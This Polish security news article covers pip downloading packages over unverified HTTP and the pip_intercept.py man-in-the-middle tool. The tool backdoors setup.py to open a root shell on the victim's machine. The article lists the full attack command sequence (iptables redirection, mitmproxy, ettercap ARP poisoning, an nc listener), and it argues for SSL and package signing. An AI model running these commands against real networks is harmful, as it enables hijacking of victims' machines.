pip ściąga paczki po HTTP, działa z prawami roota i nie weryfikuje autentyczności pobieranych plików. To oznacza, że użytkownicy pipa dają uprawnienia roota na swoich maszynach każdemu, kto może przejąć ich połączenie, czyli przeprowadzić tzw. atak Man in the Middle (np. arp poisoning). Atak ten jest stosunkowo prosty do wykonania w większości sieci LAN oraz otwartych lub chronionych WEP-em sieciach WiFi. Przechwytywanie paczek instalowanych przez pip Jeden z internautów stworzył skrypt pip_intercept.py, który przejmuje wszystkie paczki instalowane z PyPi. Skrypt rozpakowuje je, dodaje do pliku setup.py dodatkową linijkę, która sprawia, że ofiara nieświadomie nawiązuje połączenie z maszyną atakującego udostępniając mu shella na prawach roota. Instrukcje ataku są proste, po ściągnięciu pip_intercept.py należy wydać następujące polecenia: sudo apt-get install atool sudo pip install mitmproxy echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward sudo iptables -t nat -A POSTROUTING -j MASQUERADE sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 mitmproxy -T -z -s pip_intercept.py sudo ettercap -o -T -P repoison_arp -M arp:remote /GATEWAY_IP/ /OFIARA_IP/ nc -l 4444 …i poczekać, aż ofiara postanowi ściągnąć jakąś paczkę poprzez pipa. Nic nowego, po prostu niedbałość Powyższy atak to tak naprawdę nic nowego, ot ciekawe zobrazowanie skutków ataku MITM. Miejmy nadzieję, że wypuszczenie narzędzia pip_intercept.py, podobnie jak było to w przypadku dodatku Firesheep, wymusi na PyPi podniesienie bezpieczeństwa instalacji paczek poprzez zablokowanie pobierania ich nie po SSL-u oraz rozpoczęcie ich podpisywania. Na marginesie warto zauważyć, że sama standardowa biblioteka Pythona nie weryfikuje autentyczności certyfiktów SSL… Przypomnijmy, że wektor ataku polegający na podmianie instalowanych paczek został wykorzystany we Flame — robak spoofował certyfikat Microsoftu i podszywał sie pod mechanizm Windows Update. P.S. Dla odmiany, tym razem problem nie dotyczy Ruby’ego — gem korzysta z SSL i weryfikuje certyfikaty. A jeśli coś się nie zgadza, wyświetla następujący komunikat: WARNING: Error fetching data: SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/latest_specs.4.8.gz) ERROR: While executing gem ... (Gem::RemoteFetcher::FetchError) SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/gems/bundler-1.2.3.gem) ,vi.curry